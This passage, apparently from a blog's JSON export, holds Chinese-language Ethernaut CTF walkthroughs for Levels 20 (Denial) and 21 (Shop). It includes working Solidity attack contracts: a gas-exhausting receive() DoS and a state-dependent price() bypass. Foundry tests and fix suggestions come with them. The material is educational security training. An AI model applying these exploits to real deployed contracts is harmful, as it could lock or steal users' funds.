默认会转发所有剩余的 Gas。如果 <code>partner</code> 合约的 <code>receive()</code> 或 <code>fallback()</code> 函数是一个 Gas 陷阱（例如，一个无限循环），它将耗尽所有 Gas，导致整个 <code>withdraw()</code> 交易因 <code>out of gas</code> 而失败。</li>\n</ol>\n<p>攻击思路就是利用这一点。我们将部署一个恶意合约，并将其设置为 <code>partner</code>。当 <code>owner</code> 调用 <code>withdraw()</code> 时，对我们恶意合约的 <code>call</code> 将会执行，触发我们的恶意逻辑，从而使整个交易失败。</p>\n<p>我们的恶意合约只需要一个 <code>receive()</code> 函数，其中包含一个无限循环：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract MaliciousPartner &#123;</span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        // Consume all gas</span><br><span class=\"line\">        while (true) &#123;&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>当 <code>withdraw()</code> 函数向这个合约发送以太币时，<code>receive()</code> 函数被触发，进入无限循环，耗尽所有 Gas，导致 <code>withdraw()</code> 交易 <code>revert</code>。<code>owner</code> 永远无法成功提取资金。</p>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><p>攻击合约非常简单，只需要一个 <code>receive()</code> 函数。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">// 恶意合约，用于发动 DoS 攻击</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    // 当接收到以太币时，进入无限循环以耗尽所有 Gas</span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        while (true) &#123;&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Foundry-测试代码\"><a href=\"#Foundry-测试代码\" class=\"headerlink\" title=\"Foundry 测试代码\"></a>Foundry 测试代码</h3><p>测试代码需要验证 <code>withdraw()</code> 调用确实失败了。我们可以使用 Foundry 的 <code>vm.expectRevert()</code> 来实现这一点。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/20_Denial.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract DenialTest is Test &#123;</span><br><span class=\"line\">    Denial instance;</span><br><span class=\"line\">    Attack attacker;</span><br><span class=\"line\">    address owner;</span><br><span class=\"line\">    address player; // 攻击者</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        owner = vm.addr(1);</span><br><span class=\"line\">        player = vm.addr(2);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 部署 Denial 合约并存入 1 ether</span><br><span class=\"line\">        vm.startPrank(owner);</span><br><span class=\"line\">        instance = new Denial();</span><br><span class=\"line\">        vm.deal(address(instance), 1 ether);</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\"></span><br><span class=\"line\">        // 部署攻击合约</span><br><span class=\"line\">        attacker = new Attack();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testDenialOfServiceAttack() public &#123;</span><br><span class=\"line\">        // 1. 攻击者将恶意合约设置为 partner</span><br><span class=\"line\">        vm.prank(player);</span><br><span class=\"line\">        instance.setWithdrawPartner(address(attacker));</span><br><span class=\"line\"></span><br><span class=\"line\">        // 2. owner 尝试提款</span><br><span class=\"line\">        vm.startPrank(owner);</span><br><span class=\"line\">        uint256 initialOwnerBalance = owner.balance;</span><br><span class=\"line\"></span><br><span class=\"line\">        // 3. 断言交易会失败 (revert)</span><br><span class=\"line\">        // 因为对恶意 partner 的调用会耗尽所有 gas</span><br><span class=\"line\">        vm.expectRevert();</span><br><span class=\"line\">        instance.withdraw();</span><br><span class=\"line\"></span><br><span class=\"line\">        // 4. 验证 owner 的余额没有增加</span><br><span class=\"line\">        assertEq(owner.balance, initialOwnerBalance);</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>部署恶意合约</strong>: 创建一个 <code>Attack</code> 合约，其 <code>receive()</code> 函数包含一个无限循环。</li>\n<li><strong>设置 <code>partner</code></strong>: 调用 <code>setWithdrawPartner()</code>，将 <code>Denial</code> 合约的 <code>partner</code> 设置为 <code>Attack</code> 合约的地址。</li>\n<li><strong>触发漏洞</strong>: 当 <code>owner</code> 调用 <code>withdraw()</code> 时，对 <code>partner</code> 的 <code>call</code> 会触发 <code>Attack</code> 合约的 <code>receive()</code> 函数，耗尽所有 Gas，导致整个交易失败。</li>\n</ol>\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><ol>\n<li><p><strong>检查外部调用的返回值</strong>: 永远不要假设外部调用会成功。必须检查 <code>call</code> 的返回值，并对失败情况进行处理。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 修复建议</span><br><span class=\"line\">(bool sent, ) = partner.call&#123;value: amountToSend&#125;(&quot;&quot;);</span><br><span class=\"line\">require(sent, &quot;Failed to send Ether to partner&quot;);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>遵循“检查-生效-交互”模式</strong>: 应该在所有状态变更之后再与外部合约交互。虽然在本例中不是直接原因，但这是一个通用的安全最佳实践。</p>\n</li>\n<li><p><strong>限制 Gas</strong>: 在进行外部调用时，明确指定转发的 Gas 数量，而不是使用默认的全额转发。这可以限制恶意合约可能造成的损害。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 限制 Gas</span><br><span class=\"line\">partner.call&#123;value: amountToSend, gas: 50000&#125;(&quot;&quot;);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>引入提款模式 (Pull-over-Push)</strong>: 不要主动“推送”资金给用户，而是让用户自己“拉取”（提款）。用户调用一个函数来提款，而不是合约自动发送资金。这可以防止因外部调用失败而导致的问题。</p>\n</li>\n</ol>\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><ul>\n<li><strong>拒绝服务 (DoS)</strong>: 一种常见的攻击类型，旨在使系统无法为合法用户提供服务。</li>\n<li><strong><code>call</code></strong>: Solidity 中用于与其他合约交互的底层函数。它功能强大但也很危险，需要小心使用。</li>\n<li><strong><code>receive()</code> 函数</strong>: 合约在接收到没有 <code>calldata</code> 的以太币时执行的特殊函数。</li>\n<li><strong>Gas</strong>: EVM 中用于衡量计算成本的单位。对 Gas 的操纵是许多高级攻击的基础。</li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li>对外部合约的调用是不可信的，可能会失败或被恶意利用。</li>\n<li>必须始终检查底层 <code>call</code> 的返回值。</li>\n<li>不受限制的 Gas 转发会给恶意合约执行任意复杂（且耗 Gas）代码的机会。</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>通过一个可被任意设置的地址，将恶意合约引入到目标合约的执行流程中。</li>\n<li>在恶意合约的 <code>receive()</code> 或 <code>fallback()</code> 函数中制造 Gas 陷阱，耗尽交易的 Gas，导致主调用失败。</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>检查 <code>call</code> 的返回值。</li>\n<li>限制外部调用的 Gas。</li>\n<li>优先使用“提款”模式而不是“推送”模式。</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://docs.soliditylang.org/en/latest/contracts.html#sending-ether\">Solidity Docs: Sending Ether</a></li>\n<li><a href=\"https://consensys.net/diligence/blog/2018/05/known-attacks-in-smart-contracts-and-how-to-avoid-them/#denial-of-service-dos\">Consensys: Denial of Service</a></li>\n</ul>\n"},{"title":"Ethernaut Level 21: Shop - 外部调用状态变化漏洞","date":"2025-01-25T08:50:00.000Z","updated":"2025-01-25T08:50:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"利用一个看似是 `view` 的外部调用函数在两次调用之间改变状态，从而绕过安全检查。学习如何设计一个在不同调用中返回不同值的 `price()` 函数，以低于预期的价格买下商品，掌握 Shop 关卡的破解技巧。","_content":"\n# 🎯 Ethernaut Level 21: Shop - 外部调用状态变化漏洞\n\n> **关卡链接**: [Ethernaut Level 21 - Shop](https://ethernaut.openzeppelin.com/level/21)  \n> **攻击类型**: 外部调用状态变化 / 伪 `view` 函数  \n> **难度**: ⭐⭐☆☆☆\n\n## 📋 挑战目标\n\n你需要从 `Shop` 合约中买下商品。但有一个条件：你必须以低于原价（100）的价格买下它。最终目标是让 `price` 变量的值小于100，并且 `isSold` 为 `true`。\n\n![Shop Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel21.svg)\n\n## 🔍 漏洞分析\n\n让我们看一下 `Shop` 合约的 `buy()` 函数：\n\n```solidity\ncontract Shop {\n    uint public price = 100;\n    bool public isSold;\n\n    function buy() public {\n        Buyer _buyer = Buyer(msg.sender);\n\n        if (_buyer.price() >= price && !isSold) {\n            isSold = true;\n            price = _buyer.price();\n        }\n    }\n}\n\n// The interface the buyer must implement\ninterface Buyer {\n    function price() external view returns (uint);\n}\n```\n\n漏洞在于 `buy()` 函数对外部合约 `_buyer` 的 `price()` 函数进行了两次调用：\n\n1.  **第一次调用**: 在 `if` 条件判断中 `_buyer.price() >= price`。\n2.  **第二次调用**: 在 `if` 块内部，用于更新 `price` 变量 `price = _buyer.price()`。\n\n`Buyer` 接口将 `price()` 函数标记为 `view`，这通常意味着该函数不应改变状态。然而，EVM **并不强制 `view` 函数不能依赖于状态**。一个外部合约的 `view` 函数完全可以在两次调用之间返回不同的值，只要它的返回值依赖于某些在两次调用之间发生变化的状态。\n\n我们的攻击思路如下：\n\n1.  创建一个攻击合约，实现 `Buyer` 接口。\n2.  在攻击合约的 `price()` 函数中加入逻辑：如果 `Shop` 合约的 `isSold` 状态为 `false`，则返回一个大于或等于100的值（例如101），以通过 `if` 检查。如果 `isSold` 为 `true`，则返回一个小于100的值（例如1）。\n3.  当我们调用 `buy()` 时：\n    *   `if` 条件检查：`isSold` 是 `false`，我们的 `price()` 返回 `101`。`101 >= 100` 为真，检查通过。\n    *   进入 `if` 块：`isSold` 被设置为 `true`。\n    *   更新 `price`：`price = _buyer.price()` 被调用。此时 `isSold` 已经是 `true`，所以我们的 `price()` 函数返回 `1`。`Shop` 合约的 `price` 变量被更新为 `1`。\n\n这样，我们就成功地以低价买下了商品。\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n攻击合约实现了 `Buyer` 接口，其 `price()` 函数根据 `Shop` 合约的 `isSold` 状态返回不同的值。\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IShop {\n    function isSold() external view returns (bool);\n    function price() external view returns (uint);\n    function buy() external;\n}\n\ncontract Attack {\n    IShop shop;\n\n    constructor(address _shopAddress) {\n        shop = IShop(_shopAddress);\n    }\n\n    // 这个 price 函数是攻击的核心\n    function price() public view returns (uint256) {\n        // 如果商品还没卖出，返回高价以通过检查\n        // 如果已经卖出（在同一次 buy 调用中），返回低价来更新 price\n        if (shop.isSold()) {\n            return 1;\n        } else {\n            return 101;\n        }\n    }\n\n    function attack() public {\n        shop.buy();\n    }\n}\n```\n\n### Foundry 测试代码\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/21_Shop.sol\";\n\n// Attack contract (as defined above)\ncontract Attack {\n    IShop shop;\n    constructor(address _shop) { shop = IShop(_shop); }\n    function price() public view returns (uint256) { return shop.isSold() ? 1 : 101; }\n    function attack() public { shop.buy(); }\n}\n\ncontract ShopTest is Test {\n    Shop instance;\n    Attack attacker;\n    address player;\n\n    function setUp() public {\n        player = vm.addr(1);\n        instance = new Shop();\n        attacker = new Attack(address(instance));\n    }\n\n    function testAttack() public {\n        vm.startPrank(player);\n        attacker.attack();\n        vm.stopPrank();\n\n        // 验证攻击是否成功\n        assertEq(instance.price(), 1, \"Price should be updated to 1\");\n        assertTrue(instance.isSold(), \"isSold should be true\");\n    }\n}\n```\n\n### 关键攻击步骤\n\n1.  **部署攻击合约**: 创建 `Attack` 合约，它实现了 `Buyer` 接口。\n2.  **调用 `attack()`**: `Attack` 合约的 `attack()` 函数调用 `Shop` 合约的 `buy()` 函数。\n3.  **双重返回值**: `Shop` 合约在同一次 `buy()` 调用中两次调用 `Attack` 合约的 `price()` 函数，但由于 `Shop` 的内部状态 `isSold` 发生了变化，`Attack` 的 `price()` 函数返回了两个不同的值，从而绕过了逻辑检查并以低价成交。\n\n## 🛡️ 防御措施\n\n1.  **不要在一次交易中多次调用外部 `view` 函数**: 如果必须这样做，请将第一次调用的返回值存储在一个局部变量中，并在后续逻辑中使用这个局部变量，而不是再次进行外部调用。\n\n    ```solidity\n    // 修复建议\n    function buy() public {\n        Buyer _buyer = Buyer(msg.sender);\n        uint _price = _buyer.price(); // 只调用一次，并将结果存入局部变量\n\n        if (_price >= price && !isSold) {\n            isSold = true;\n            price = _price; // 使用局部变量\n        }\n    }\n    ```\n\n2.  **遵循“检查-生效-交互”模式**: 尽管本例中的交互是一个 `view` 函数，但它仍然是与外部合约的交互。最佳实践是在所有状态变更（“生效”）之后再进行交互。然而，在本例中，更好的修复方法是缓存返回值。\n\n## 🔧 相关工具和技术\n\n-   **`view` 函数的误解**: `view` 关键字只向编译器承诺该函数不会修改状态。它并不保证函数的返回值是纯粹的或在一次交易中保持不变。\n-   **跨合约调用的状态依赖**: 一个合约的函数可以依赖于另一个合约的状态，这可能导致像本例中这样意想不到的行为。\n-   **Foundry `prank`**: 模拟来自特定地址（`player` -> `attacker`）的调用链，是测试此类交互式攻击的理想工具。\n\n## 🎯 总结\n\n**核心概念**:\n-   外部 `view` 函数的返回值不是恒定的，它可以在一次交易的不同阶段发生变化。\n-   在一次函数执行中多次调用同一个外部 `view` 函数是一个危险的模式，因为它的返回值可能在你意想不到的时候发生改变。\n\n**攻击向量**:\n-   设计一个恶意的 `view` 函数，使其根据目标合约的状态返回不同的值。\n-   利用目标合约在检查和执行阶段之间状态的变化，来操纵 `view` 函数的返回值，从而绕过安全检查。\n\n**防御策略**:\n-   当需要多次使用外部调用的结果时，应将其缓存在一个局部变量中，以确保其在整个函数执行过程中的一致性。\n\n## 📚 参考资料\n\n-   [Solidity Docs: View Functions](https://docs.soliditylang.org/en/latest/contracts.html#view-functions)\n-   [SWC-113: DoS with Failed Call](https://swcregistry.io/docs/SWC-113) (虽然不是直接的DoS，但原理相似，都涉及到对外部调用结果的错误处理)","source":"_posts/ethernaut-level-21-shop.md","raw":"---\ntitle: 'Ethernaut Level 21: Shop - 外部调用状态变化漏洞'\ndate: 2025-01-25 16:50:00\nupdated: 2025-01-25 16:50:00\ncategories:\n  - Ethernaut 系列\n  - 高级攻击篇 (21-25)\ntags:\n  - Ethernaut\n  - Foundry\n  - Reentrancy\n  - View Function\n  - 智能合约安全\n  - Solidity\nseries: Ethernaut Foundry Solutions\nexcerpt: \"利用一个看似是 `view` 的外部调用函数在两次调用之间改变状态，从而绕过安全检查。学习如何设计一个在不同调用中返回不同值的 `price()` 函数，以低于预期的价格买下商品，掌握 Shop 关卡的破解技巧。\"\n---\n\n# 🎯 Ethernaut Level 21: Shop - 外部调用状态变化漏洞\n\n> **关卡链接**: [Ethernaut Level 21 - Shop](https://ethernaut.openzeppelin.com/level/21)  \n> **攻击类型**: 外部调用状态变化 / 伪 `view` 函数  \n> **难度**: ⭐⭐☆☆☆\n\n## 📋 挑战目标\n\n你需要从 `Shop` 合约中买下商品。但有一个条件：你必须以低于原价（100）的价格买下它。最终目标是让 `price` 变量的值小于100，并且 `isSold` 为 `true`。\n\n![Shop Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel21.svg)\n\n## 🔍 漏洞分析\n\n让我们看一下 `Shop` 合约的 `buy()` 函数：\n\n```solidity\ncontract Shop {\n    uint public price = 100;\n    bool public isSold;\n\n    function buy() public {\n        Buyer _buyer = Buyer(msg.sender);\n\n        if (_buyer.price() >= price && !isSold) {\n            isSold = true;\n            price = _buyer.price();\n        }\n    }\n}\n\n// The interface the buyer must implement\ninterface Buyer {\n    function price() external view returns (uint);\n}\n```\n\n漏洞在于 `buy()` 函数对外部合约 `_buyer` 的 `price()` 函数进行了两次调用：\n\n1.  **第一次调用**: 在 `if` 条件判断中 `_buyer.price() >= price`。\n2.  **第二次调用**: 在 `if` 块内部，用于更新 `price` 变量 `price = _buyer.price()`。\n\n`Buyer` 接口将 `price()` 函数标记为 `view`，这通常意味着该函数不应改变状态。然而，EVM **并不强制 `view` 函数不能依赖于状态**。一个外部合约的 `view` 函数完全可以在两次调用之间返回不同的值，只要它的返回值依赖于某些在两次调用之间发生变化的状态。\n\n我们的攻击思路如下：\n\n1.  创建一个攻击合约，实现 `Buyer` 接口。\n2.  在攻击合约的 `price()` 函数中加入逻辑：如果 `Shop` 合约的 `isSold` 状态为 `false`，则返回一个大于或等于100的值（例如101），以通过 `if` 检查。如果 `isSold` 为 `true`，则返回一个小于100的值（例如1）。\n3.  当我们调用 `buy()` 时：\n    *   `if` 条件检查：`isSold` 是 `false`，我们的 `price()` 返回 `101`。`101 >= 100` 为真，检查通过。\n    *   进入 `if` 块：`isSold` 被设置为 `true`。\n    *   更新 `price`：`price = _buyer.price()` 被调用。此时 `isSold` 已经是 `true`，所以我们的 `price()` 函数返回 `1`。`Shop` 合约的 `price` 变量被更新为 `1`。\n\n这样，我们就成功地以低价买下了商品。\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n攻击合约实现了 `Buyer` 接口，其 `price()` 函数根据 `Shop` 合约的 `isSold` 状态返回不同的值。\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IShop {\n    function isSold() external view returns (bool);\n    function price() external view returns (uint);\n    function buy() external;\n}\n\ncontract Attack {\n    IShop shop;\n\n    constructor(address _shopAddress) {\n        shop = IShop(_shopAddress);\n    }\n\n    // 这个 price 函数是攻击的核心\n    function price() public view returns (uint256) {\n        // 如果商品还没卖出，返回高价以通过检查\n        // 如果已经卖出（在同一次 buy 调用中），返回低价来更新 price\n        if (shop.isSold()) {\n            return 1;\n        } else {\n            return 101;\n        }\n    }\n\n    function attack() public {\n        shop.buy();\n    }\n}\n```\n\n### Foundry 测试代码\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/21_Shop.sol\";\n\n// Attack contract (as defined above)\ncontract Attack {\n    IShop shop;\n    constructor(address _shop) { shop = IShop(_shop); }\n    function price() public view returns (uint256) { return shop.isSold() ? 1 : 101; }\n    function attack() public { shop.buy(); }\n}\n\ncontract ShopTest is Test {\n    Shop instance;\n    Attack attacker;\n    address player;\n\n    function setUp() public {\n        player = vm.addr(1);\n        instance = new Shop();\n        attacker = new Attack(address(instance));\n    }\n\n    function testAttack() public {\n        vm.startPrank(player);\n        attacker.attack();\n        vm.stopPrank();\n\n        // 验证攻击是否成功\n        assertEq(instance.price(), 1, \"Price should be updated to 1\");\n        assertTrue(instance.isSold(), \"isSold should be true\");\n    }\n}\n```\n\n### 关键攻击步骤\n\n1.  **部署攻击合约**: 创建 `Attack` 合约，它实现了 `Buyer` 接口。\n2.  **调用 `attack()`**: `Attack` 合约的 `attack()` 函数调用 `Shop` 合约的 `buy()` 函数。\n3.  **双重返回值**: `Shop` 合约在同一次 `buy()` 调用中两次调用 `Attack` 合约的 `price()` 函数，但由于 `Shop` 的内部状态 `isSold` 发生了变化，`Attack` 的 `price()` 函数返回了两个不同的值，从而绕过了逻辑检查并以低价成交。\n\n## 🛡️ 防御措施\n\n1.  **不要在一次交易中多次调用外部 `view` 函数**: 如果必须这样做，请将第一次调用的返回值存储在一个局部变量中，并在后续逻辑中使用这个局部变量，而不是再次进行外部调用。\n\n    ```solidity\n    // 修复建议\n    function buy() public {\n        Buyer _buyer = Buyer(msg.sender);\n        uint _price = _buyer.price(); // 只调用一次，并将结果存入局部变量\n\n        if (_price >= price && !isSold) {\n            isSold = true;\n            price = _price; // 使用局部变量\n        }\n    }\n    ```\n\n2.  **遵循“检查-生效-交互”模式**: 尽管本例中的交互是一个 `view` 函数，但它仍然是与外部合约的交互。最佳实践是在所有状态变更（“生效”）之后再进行交互。然而，在本例中，更好的修复方法是缓存返回值。\n\n## 🔧 相关工具和技术\n\n-   **`view` 函数的误解**: `view` 关键字只向编译器承诺该函数不会修改状态。它并不保证函数的返回值是纯粹的或在一次交易中保持不变。\n-   **跨合约调用的状态依赖**: 一个合约的函数可以依赖于另一个合约的状态，这可能导致像本例中这样意想不到的行为。\n-   **Foundry `prank`**: 模拟来自特定地址（`player` -> `attacker`）的调用链，是测试此类交互式攻击的理想工具。\n\n## 🎯 总结\n\n**核心概念**:\n-   外部 `view` 函数的返回值不是恒定的，它可以在一次交易的不同阶段发生变化。\n-   在一次函数执行中多次调用同一个外部 `view` 函数是一个危险的模式，因为它的返回值可能在你意想不到的时候发生改变。\n\n**攻击向量**:\n-   设计一个恶意的 `view` 函数，使其根据目标合约的状态返回不同的值。\n-   利用目标合约在检查和执行阶段之间状态的变化，来操纵 `view` 函数的返回值，从而绕过安全检查。\n\n**防御策略**:\n-   当需要多次使用外部调用的结果时，应将其缓存在一个局部变量中，以确保其在整个函数执行过程中的一致性。\n\n## 📚 参考资料\n\n-   [Solidity Docs: View Functions](https://docs.soliditylang.org/en/latest/contracts.html#view-functions)\n-   [SWC-113: DoS with Failed Call](https://swcregistry.io/docs/SWC-113) (虽然不是直接的DoS，但原理相似，都涉及到对外部调用结果的错误处理)","slug":"ethernaut-level-21-shop","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpi001ibf5q5lkbdbaw","content":"<h1 id=\"🎯-Ethernaut-Level-21-Shop-外部调用状态变化漏洞\"><a href=\"#🎯-Ethernaut-Level-21-Shop-外部调用状态变化漏洞\" class=\"headerlink\" title=\"🎯 Ethernaut Level 21: Shop - 外部调用状态变化漏洞\"></a>🎯 Ethernaut Level 21: Shop - 外部调用状态变化漏洞</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/21\">Ethernaut Level 21 - Shop</a><br><strong>攻击类型</strong>: 外部调用状态变化 &#x2F; 伪 <code>view</code> 函数<br><strong>难度</strong>: ⭐⭐☆☆☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>你需要从 <code>Shop</code> 合约中买下商品。但有一个条件：你必须以低于原价（100）的价格买下它。最终目标是让 <code>price</code> 变量的值小于100，并且 <code>isSold</code> 为 <code>true</code>。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel21.svg\" alt=\"Shop Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><p>让我们看一下 <code>Shop</code> 合约的 <code>buy()</code> 函数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract Shop &#123;</span><br><span class=\"line\">    uint public price = 100;</span><br><span class=\"line\">    bool public isSold;</span><br><span class=\"line\"></span><br><span class=\"line\">    function buy() public &#123;</span><br><span class=\"line\">        Buyer _buyer = Buyer(msg.sender);</span><br><span class=\"line\"></span><br><span class=\"line\">        if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class=\"line\">            isSold = true;</span><br><span class=\"line\">            price = _buyer.price();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// The interface the buyer must implement</span><br><span class=\"line\">interface Buyer &#123;</span><br><span class=\"line\">    function price() external view returns (uint);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>漏洞在于 <code>buy()</code> 函数对外部合约 <code>_buyer</code> 的 <code>price()</code> 函数进行了两次调用：</p>\n<ol>\n<li><strong>第一次调用</strong>: 在 <code>if</code> 条件判断中 <code>_buyer.price() &gt;= price</code>。</li>\n<li><strong>第二次调用</strong>: 在 <code>if</code> 块内部，用于更新 <code>price</code> 变量 <code>price = _buyer.price()</code>。</li>\n</ol>\n<p><code>Buyer</code> 接口将 <code>price()</code> 函数标记为 <code>view</code>，这通常意味着该函数不应改变状态。然而，EVM <strong>并不强制 <code>view</code> 函数不能依赖于状态</strong>。一个外部合约的 <code>view</code> 函数完全可以在两次调用之间返回不同的值，只要它的返回值依赖于某些在两次调用之间发生变化的状态。</p>\n<p>我们的攻击思路如下：</p>\n<ol>\n<li>创建一个攻击合约，实现 <code>Buyer</code> 接口。</li>\n<li>在攻击合约的 <code>price()</code> 函数中加入逻辑：如果 <code>Shop</code> 合约的 <code>isSold</code> 状态为 <code>false</code>，则返回一个大于或等于100的值（例如101），以通过 <code>if</code> 检查。如果 <code>isSold</code> 为 <code>true</code>，则返回一个小于100的值（例如1）。</li>\n<li>当我们调用 <code>buy()</code> 时：<ul>\n<li><code>if</code> 条件检查：<code>isSold</code> 是 <code>false</code>，我们的 <code>price()</code> 返回 <code>101</code>。<code>101 &gt;= 100</code> 为真，检查通过。</li>\n<li>进入 <code>if</code> 块：<code>isSold</code> 被设置为 <code>true</code>。</li>\n<li>更新 <code>price</code>：<code>price = _buyer.price()</code> 被调用。此时 <code>isSold</code> 已经是 <code>true</code>，所以我们的 <code>price()</code> 函数返回 <code>1</code>。<code>Shop</code> 合约的 <code>price</code> 变量被更新为 <code>1</code>。</li>\n</ul>\n</li>\n</ol>\n<p>这样，我们就成功地以低价买下了商品。</p>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 